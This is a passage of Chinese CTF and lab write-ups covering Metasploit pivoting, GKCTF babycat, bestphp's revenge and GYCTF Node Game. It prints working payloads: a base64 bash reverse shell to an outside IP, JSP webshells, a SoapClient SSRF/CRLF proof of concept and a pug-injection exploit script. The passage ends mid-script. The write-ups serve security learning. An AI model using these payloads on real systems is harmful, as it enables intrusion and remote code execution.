windows/x64/meterpreter/bind_tcp<span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.33</span><span class="hljs-number">.33</span><span class="hljs-keyword">set</span> LPORT <span class="hljs-number">4444</span>run</code></pre><p>执行</p><p><img src="/2023/09/19/cfs/46.png" alt="46"></p><p><img src="/2023/09/19/cfs/47.png" alt="47"></p><p>进入命令行</p><p><img src="/2023/09/19/cfs/48.png" alt="48"></p><p>成功拿下！</p><h3 id="三、总结"><a class="header-anchor" href="#三、总结">🍭</a>三、总结</h3><p>此次渗透涉及知识点：</p><ul><li>Thinkphp5.x Rce漏洞利用</li><li>MSF添加路由和socks代理</li><li>八哥CMS的漏洞利用Getshell，</li><li>sql注入–&gt;后台管理登陆，</li><li>大马、小马</li><li>Ms17-010的psexec利用模块的使用</li></ul><p>思路：将centos主机作为跳板从而横向移动通过利用MSF的路由功能，不断添加路由+socks代理，横向移动到内网。</p><p>注意点：</p><ul><li>sqlmap、dirb进行扫描时很容易导致服务器time out，此时要尝试一下手工注入</li><li>在使用msf的时候注意session的存活状态，session过期就重试一遍</li><li>kali上的proxychains4不太稳定</li></ul>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（十二）</title>
    <link href="/2021/08/23/un/"/>
    <url>/2021/08/23/un/</url>
    
    <content type="html"><![CDATA[<h1>[GKCTF 2021]babycat</h1><p>题目不允许注册，查看源码，是默认跳出Not Allowed，构造POST请求</p><pre><code class="hljs ini"><span class="hljs-attr">data</span>=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;</code></pre><p>即可注册，登录后有下载，上传两个功能，上传功能只有管理员可以使用；下载功能可目录穿越，存在任意文件下载。Java题一般都是下web.xml-&gt;class-&gt;审计-&gt;RCE这个套路。</p><p>读web.xml</p><p><img src="/2021/08/23/un/1.png" alt="1"></p><p>读对应的功能模块代码(web.xml一般在WEB-INF下)</p><pre><code class="hljs gradle">com.web.servlet.loginServlet-&gt; ..<span class="hljs-regexp">/classes/</span>com<span class="hljs-regexp">/web/</span>servlet/loginServlet.<span class="hljs-keyword">class</span></code></pre><p>先看register的,找到针对role的处理:</p><p><img src="/2021/08/23/un/2.png" alt="2"></p><p>接受data数参数，正则匹配<code>&quot;role&quot;:&quot;(.*?)&quot;</code>把所有内容进行完整匹配，但JSON中的内联注释不会影响其解析，因此可以使用注释来破坏正则匹配，我们需让正则匹配有结果从而保证role变量有内容（防止执行if另一分支）。JSON中键值一样的数据解析时后面的会覆盖前面的，构造payload</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;username&quot;</span>:<span class="hljs-string">&quot;11&quot;</span>, <span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;11&quot;</span>,<span class="hljs-attr">&quot;role&quot;</span>:<span class="hljs-string">&quot;guest&quot;</span>, <span class="hljs-attr">&quot;role&quot;</span><span class="hljs-comment">/**/</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;</code></pre><p>但下面还有一个for循环</p><p><img src="/2021/08/23/un/3.png" alt="3"></p><p>对最后一个匹配的进行强制替换，再构造payload：</p><pre><code class="hljs elixir">data=&#123;<span class="hljs-string">&quot;username&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;11&quot;</span></span>,<span class="hljs-string">&quot;password&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;11&quot;</span></span>,<span class="hljs-string">&quot;role&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;admin&quot;</span>/*</span>,<span class="hljs-string">&quot;role&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;guest&quot;</span>*/</span>&#125;</code></pre><p>POST提交，得到admin身份</p><p><img src="/2021/08/23/un/6.png" alt="6"></p><p>再看upload的代码</p><p><img src="/2021/08/23/un/4.png" alt="4"></p><p>对内容和文件后缀列了白名单，再往下看</p><p><img src="/2021/08/23/un/5.png" alt="5"></p><p>upload failed后forward之后没有return回来，所以后面的代码会继续执行。简单来说就是进程没有die掉，还能继续执行。java的forward是执行完当前所有代码才会执行forward那个文件的代码，详见：<a href="https://blog.csdn.net/qq_22075041/article/details/78736723">sendRedirect()之后的代码是否会继续执行</a>。这里就可以未授权上传任意文件；随便构造错误语句看回显可知环境是tomcat。</p><p>tomcat的目录结构：</p><pre><code class="hljs actionscript">webapps    <span class="hljs-keyword">static</span>    WEB-INF        classes</code></pre><p>tomcat的static文件夹可以访问，跨目录上传jsp马到static下即可RCE，js马详见：<a href="https://blog.csdn.net/qq_38656841/article/details/96181472">利用动态二进制加密实现新型一句话木马之Java篇(转) 冰蝎_时光凉春衫薄的博客-CSDN博客</a></p><p><img src="/2021/08/23/un/10.png" alt="10"></p><p>读取</p><p><img src="/2021/08/23/un/7.png" alt="7"></p><h4 id="解法二-非预期"><a class="header-anchor" href="#解法二-非预期">🍭</a>解法二(非预期)</h4><p>upload的dopost没验证身份，可以直接构造上传的，所以解法一中获取admin身份就可以略掉</p><h4 id="解法三"><a class="header-anchor" href="#解法三">🍭</a>解法三</h4><p>在com.web.dao.baseDao中使⽤了xmldecoder，登录或注册会触发baseDao.getConnection();触发/db/db.xml<br>此时上传进行目录穿越覆盖db.xml，登录或注册触发xml反序列化漏洞。这里<code>filename=&quot;../../db/db.xml&quot;</code> 。xmldecoder是weblogic的漏洞，详见：<a href="https://blog.csdn.net/yumengzth/article/details/97522783">CVE-2017-10271</a>，但过滤了ProcessBuilder原本的payload就会失效，base编码即可绕过。</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span></span><span class="hljs-template-variable">&#123;echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMTk1LjE0OS41MC83NTc1IDA+JjEn&#125;</span><span class="xml">|</span><span class="hljs-template-variable">&#123;b</span><span class="hljs-template-variable">ase64,-d&#125;</span><span class="xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span></code></pre><p>反弹shell。</p><h1>[GKCTF 2021]babycat-revenge</h1><p>这题就是将上题的非预期修复掉，upload failed后无return，及dopost未身份验证这两个问题，也就是对应上述解法一，二。dopost未验证修复后只能用注释绕过登录，同上。所以对本题来说，解法三依旧适用，此外还可以传js马：</p><p>java.io.PrintWriter对绝对路径的文件进行写入，前面利用任意文件读取可以得到绝对路径，将shell写到static下</p><pre><code class="hljs reasonml">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt; &lt;java version=<span class="hljs-string">&quot;1.8.0_192&quot;</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt; &lt;<span class="hljs-keyword">object</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span>&gt; &lt;<span class="hljs-built_in">string</span>&gt;/usr/local/tomcat/webapps/ROOT/static/shell.jsp&lt;/<span class="hljs-built_in">string</span>&gt;&lt;void<span class="hljs-keyword">method</span>=<span class="hljs-string">&quot;println&quot;</span>&gt;&lt;<span class="hljs-built_in">string</span>&gt;&lt;!<span class="hljs-literal">[CDATA[&lt;%@<span class="hljs-identifier">page</span> <span class="hljs-identifier">import</span>=&quot;<span class="hljs-identifier">java</span>.<span class="hljs-identifier">util</span>.<span class="hljs-operator">*</span>,<span class="hljs-identifier">javax</span>.<span class="hljs-identifier">crypto</span>.<span class="hljs-operator">*</span>,<span class="hljs-identifier">javax</span>.<span class="hljs-identifier">crypto</span>.<span class="hljs-identifier">spec</span>.<span class="hljs-operator">*</span>&quot;%&gt;&lt;%!<span class="hljs-identifier">class</span> U <span class="hljs-identifier">extends</span> C<span class="hljs-identifier">lassLoader</span>&#123;U(C<span class="hljs-identifier">lassLoader</span> <span class="hljs-identifier">c</span>)&#123;<span class="hljs-identifier">super</span>(<span class="hljs-identifier">c</span>);&#125;<span class="hljs-identifier">public</span> C<span class="hljs-identifier">lass</span> <span class="hljs-identifier">g</span>(<span class="hljs-identifier">byte</span> []</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);&#125;%&gt;]]&gt;&lt;/<span class="hljs-built_in">string</span>&gt;&lt;/void&gt;&lt;void <span class="hljs-keyword">method</span>=<span class="hljs-string">&quot;close&quot;</span>/&gt;&lt;/<span class="hljs-keyword">object</span>&gt;&lt;/java&gt;</code></pre><p>or</p><pre><code class="hljs vbscript-html"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.8.0_192&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/usr/local/tomcat/webapps/ROOT/static/shell.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;println&quot;</span>&gt;</span></span><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>&lt;![CDATA[`</span><span class="vbscript">&lt;% javax.script.ScriptEngineManager manager = <span class="hljs-keyword">new</span> javax.script.ScriptEngineManager(<span class="hljs-literal">null</span>);javax.script.<span class="hljs-built_in">ScriptEngine</span> engine = manager.getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);engine.<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">&quot;shell&quot;</span>)); %&gt;</span><span class="xml">`</span><span class="xml">]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;close&quot;</span>/&gt;</span></span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span></code></pre><p>要绕一下过滤：</p><p><img src="/2021/08/23/un/12.png" alt="12"></p><p>冰蝎连接</p><p><img src="/2021/08/23/un/13.png" alt="13"></p><p>读取</p><p><img src="/2021/08/23/un/11.png" alt="11"></p><p>参考：<a href="https://www.dtmao.cc/news_show_4395934.shtml">https://www.dtmao.cc/news_show_4395934.shtml</a></p><p><a href="https://blog.csdn.net/qq_38656841/article/details/96181472">利用动态二进制加密实现新型一句话木马之Java篇(转) 冰蝎_时光凉春衫薄的博客-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>js马</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（十一）</title>
    <link href="/2021/08/21/up/"/>
    <url>/2021/08/21/up/</url>
    
    <content type="html"><![CDATA[<h1>bestphp’s revenge</h1><h4 id="利用PHP原生类来构造POP链"><a class="header-anchor" href="#利用PHP原生类来构造POP链">🍭</a>利用PHP原生类来构造POP链</h4><p>在没有可以利用类的情况下，就找不到POP链所以只能考虑PHP原生类，之前运用的都是php的一些魔术方法，但php会使用了<code>zend_class_unserialize_deny</code>来禁止一些类的反序列化，此时就需要原生类。</p><p>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</p><p><strong>SoapClient</strong>是一个php内置的类，当__call方法被触发后，它可以发送HTTP和HTTPS请求。该类的构造函数如下：</p><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span> （mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>）</code></pre><p>第一个参数是用来指明是否是wsdl模式。</p><p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。<br>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>,                                 <span class="hljs-string">&#x27;uri&#x27;</span>=&gt; <span class="hljs-string">&quot;123&quot;</span>));<span class="hljs-keyword">echo</span> urlencode(serialize($a));<span class="hljs-meta">?&gt;</span></code></pre><p>序列化后，进行url编码，是为了防止双引号带来的烦恼。</p><p>详见：<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p><h4 id="call-user-func"><a class="header-anchor" href="#call-user-func">🍭</a>call_user_func()</h4><p>当传入的参数是一个数组，且数组的第一个值是一个类的名字，或一个对象，就会把数组的第二个值当做方法执行。</p><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fun</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$a,$b</span>)</span>&#123;  \\当调用的方法不存在时，执行        <span class="hljs-keyword">echo</span> <span class="hljs-number">11</span>;    &#125;&#125;$a = <span class="hljs-keyword">new</span> fun();call_user_func(<span class="hljs-keyword">array</span>($a,<span class="hljs-string">&quot;aaaas&quot;</span>));<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#outcome：11</span></code></pre><h4 id="CRLF-Injection"><a class="header-anchor" href="#CRLF-Injection">🍭</a>CRLF Injection</h4><p>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。所以，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</p><h4 id="serialize-hander处理session方式不同导致session注入"><a class="header-anchor" href="#serialize-hander处理session方式不同导致session注入">🍭</a>serialize_hander处理session方式不同导致session注入</h4><p>serialize_handler=php：指定php序列化引擎；<br>php中的session中的内容是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。<br>在php.ini中存在三项配置项：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--设置session的存储路径</span><span class="hljs-keyword">session</span>.save_handler=&quot;&quot; <span class="hljs-comment">--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><span class="hljs-keyword">session</span>.serialize_handler   string <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)</span></code></pre><p>session.serialize_handler存在以下几种</p><table><thead><tr><th style="text-align:center">处理器</th><th style="text-align:center">对应的存储格式</th></tr></thead><tbody><tr><td style="text-align:center">php</td><td style="text-align:center">键名 + 竖线 + 经过serialize()函数反序列化处理的值</td></tr><tr><td style="text-align:center">php_binary</td><td style="text-align:center">键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数反序列化处理的值</td></tr><tr><td style="text-align:center">php_serialize(php&gt;=5.5.4)</td><td style="text-align:center">经过serialize()函数反序列处理的数组</td></tr></tbody></table><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，添加</p><pre><code class="hljs less"><span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;需要设置的引擎&#x27;</span>);</code></pre><p>当传入<code>$_SESSION['name']='|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;'; </code>序列化引擎使用的是php_serialize，那么储存的session文件为<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;xxxxx&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:“name”;s:5:&quot;当作键名，而把O:5:“xxxxx”:1:{s:4:“test”;s:3:“AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p><h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4><p>题目给了源码</p><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$b = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func($_GET[f],$_POST);session_start();<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[name]))&#123;    $_SESSION[name] = $_GET[name];&#125;var_dump($_SESSION);$a = <span class="hljs-keyword">array</span>(reset($_SESSION),<span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func($b,$a);<span class="hljs-meta">?&gt;</span></code></pre><p>flag.php</p><pre><code class="hljs sqf"><span class="hljs-comment">//flag.php</span>session_start();<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;$<span class="hljs-built_in">flag</span> = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<span class="hljs-keyword">if</span>($<span class="hljs-variable">_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;       $<span class="hljs-variable">_SESSION</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] = $<span class="hljs-built_in">flag</span>;   &#125;only localhost can get <span class="hljs-built_in">flag</span>!</code></pre><p>可以构造ssrf去访问flag.php，然后获取flag。再利用变量覆盖把SESSION中的flag打印出来。</p><p>POC</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));$payload = urlencode(serialize($attack));<span class="hljs-keyword">echo</span> $payload;</code></pre><p>大体就是:session反序列化-&gt;soap(ssrf+crlf)-&gt;call_user_func激活soap类</p><h5 id="注入poc得到的session"><a class="header-anchor" href="#注入poc得到的session">🍭</a>注入poc得到的session</h5><p><img src="/2021/08/21/up/2.png" alt="2"></p><p>利用<code>call_user_func($_GET[‘f’], $_POST);</code>改变序列化引擎为php_serialize，<code>$_SESSION[‘name’] = $_GET[‘name’];</code>将序列化对象传入session中，并在前面加一个“|”,此时session会以php_serialize的规则储存.</p><h5 id="触发反序列化使SoapClient发送请求"><a class="header-anchor" href="#触发反序列化使SoapClient发送请求">🍭</a>触发反序列化使SoapClient发送请求</h5><p><img src="/2021/08/21/up/3.png" alt="3"></p><p><code>call_user_func($_GET[‘f’], $_POST); </code>将b变量用extract函数覆盖为call_user_func。此时的序列化引擎为php，此函数会按照php的方法把刚才传入的session，进行反序列化储存在session中。</p><p><code>$a = array(reset($_SESSION), ‘welcome_to_the_lctf2018’); </code>把session与“welcome_to_the_lctf2018”和并为一个数组。</p><p>此时<code>call_user_func($b, $a);</code> 的$b变量已经被覆盖成了call_user_func，此时的程序就变成了<code>call_user_func(call_user_func,array($_session,‘welcome_to_the_lctf2018’));</code>。</p><p>$_session会调用<code>welcome_to_the_lctf2018</code>这个不存在的方法，__call方法被触发，服务器携带我们设置的cookie，去访问flag.php，然后把flag，储存在此cookie对应的session中。</p><h5 id="携带poc中的cookie访问即可得到flag"><a class="header-anchor" href="#携带poc中的cookie访问即可得到flag">🍭</a>携带poc中的cookie访问即可得到flag</h5><p><img src="/2021/08/21/up/1.png" alt="1"></p><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">https://www.cnblogs.com/20175211lyz/p/11515519.html</a></p><p><a href="https://www.anquanke.com/post/id/153065#h2-0">https://www.anquanke.com/post/id/153065#h2-0</a></p><h1>[GYCTF2020]Node Game</h1><p>题目给了源码，审计几个路由：</p><ul><li><p>/ 接受action参数。如果没有就默认为index file=dirname+/template/+action+.pug 然后用pug进行渲染。可以理解为执行这个文件 .</p></li><li><p>/file_upload 定义了只能由127.0.0.1访问。并且是remoteaddress不能伪造，得找一个SSRF的点 文件上传。 filepath=/uploads/+mimetype+/ 而mimetype可控。我们可以跨目录 dir_file=dirname+filepath+filename 那么我们可以构造任意路径文件写入.</p></li><li><p>/core 接受一个q参数。然后对其进行黑名单检测 然后对q输入的值进行请求。</p></li></ul><p>我们可以利用SSRF伪造本地ip进行文件上传，上传包含命令执行代码的pug文件到/template目录下，然后用<code>?action=</code>来包含该文件。如何用SSRF来进行文件上传，就涉及Node js的编码处理安全问题，可以参考：<a href="https://xz.aliyun.com/t/2894">大佬的文章</a></p><p>SSRF的流程是：</p><ul><li>Express获取GET query (此时urldecode一次)</li><li>将query拼接到<code>/source?</code>后面，丢给http.get请求，此时会urlencode一次</li><li>CRLF注入一个POST请求访问file_upload接口，HTTP协议报文的控制字符需要是non-encode的</li></ul><p>因为payload是在最外层报文的GET query里，所以只能利用node.js中http.get转义unicode的feature来处理特殊字符，GET请求里注入<code>\u0120, \u010d, \u010a</code>等字符，Express拿到就是对应unicode，交给http.get则会被转换为对应ascii，而不会被urlencode。注：第一个报文需要keep-alive，防止连接断开</p><p>注入一个POST请求成功后，需要上传一个pug模版，搜一下pug模板即可找到格式。</p><pre><code class="hljs markdown">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child<span class="hljs-emphasis">_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[<span class="hljs-string">&#x27;ex&#x27;+&#x27;ecSync&#x27;</span>](<span class="hljs-link">&#x27;whoami&#x27;</span>).toString()&quot;)</span><span class="hljs-emphasis">-return x</span></code></pre><p>上传后需要加载模板，可以看到<code>/?action=</code>可加载，不过限制了路径穿越，这里就很刻意了。在上传路由里保存了两次，一个重命名了保存在<code>dist</code>，另一个副本保存在<code>uploads/MIME_TYPE/FILE_NAME</code>，在MIME里跳一下目录到template就行了</p><p>大佬的EXP：</p><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requestspayload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;&quot;&quot;&quot;.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;Content-Type: ../template-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(<span class="hljs-string">&#x27;child_&#x27;</span>+<span class="hljs-string">&#x27;pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>).toString()&quot;)-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--&quot;&quot;&quot;.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)payload = payload.format(len(body), body) \    .replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;\u012b&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\u0120&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-string">&#x27;\u010d\u010a&#x27;</span>)    \    .replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\u0122&#x27;</span>)             \    .replace(&quot;&#x27;&quot;, <span class="hljs-string">&#x27;\u0a27&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;\u015b&#x27;</span>)             \    .replace(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\u015d&#x27;</span>) \    + <span class="hljs-string">&#x27;GET&#x27;</span> + <span class="hljs-string">&#x27;\u0120&#x27;</span> + <span 